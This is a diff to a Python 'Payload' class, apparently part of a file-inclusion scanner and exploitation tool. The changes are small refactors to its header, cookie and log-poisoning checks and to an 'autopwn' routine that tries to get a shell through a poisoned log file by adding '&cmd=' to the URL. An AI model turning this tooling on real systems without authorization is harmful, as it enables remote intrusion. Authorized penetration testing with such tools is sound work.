@@ -109,22 +109,17 @@ class Payload:
         self.dirTraversalCheck()
         self.filterCheck()
         
-        #dirThread = threading.Thread(target=self.dirTraversalCheck, args=[])
-        #dirThread.start()
-        #filterThread = threading.Thread(target=self.filterCheck, args=[])
-        #filterThread.start()
         # The following three are used for autopwn purposes. You can thread them but you need to join them before jumping into autopwn(). Won't do this at this point. It's fast in any case.
-        headerres = self.headerCheck()
-        cookieres = self.cookieCheck()
-        logres = self.logPoisonCheck()
+        self.headerCheck()
+        self.cookieCheck()
+        self.logPoisonCheck()
 
         if attempt_shell:
-            self.autopwn(attempt_shell, cookieres, headerres, logres, mode)
+            self.autopwn(attempt_shell, self.rce_urls, self.rce_urls, self.rce_urls, mode)
 
 
 
     def autopwn(self, attempt_shell, cookieres, headerres, logres, mode=0):
-        print(headerres)
         payload = self.payloads[mode]
         if not cookieres and not headerres and not logres:
             print(colored("[-]",'red') + " No RCE Found. Autopwn impossible...")
@@ -133,7 +128,7 @@ class Payload:
         if logres:
             # We don't have to gain rce from all the verified rce vectors. We just need one!
             log = logres[0]
-            print(colored(f"[+]",'green') + " Attempting to pwn through vulnerable log file: {log}")
+            print(colored(f"[+]",'green') + " Attempting to pwn through vulnerable log file: " + log)
             exploit = log + f'&cmd='
                 
         elif headerres:
@@ -367,7 +362,7 @@ class Payload:
             else:
                 if self.verbosity > 0:
                     print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-        return self.rce_urls  # Change rce to rce_urls
+        #return self.rce_urls  # Change rce to rce_urls
     
     
     
@@ -413,7 +408,7 @@ class Payload:
                 else:
                     if self.verbosity > 0:
                         print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
-        return self.rce_urls  # Change rce to rce_urls
+        #return self.rce_urls  # Change rce to rce_urls
 
 
 
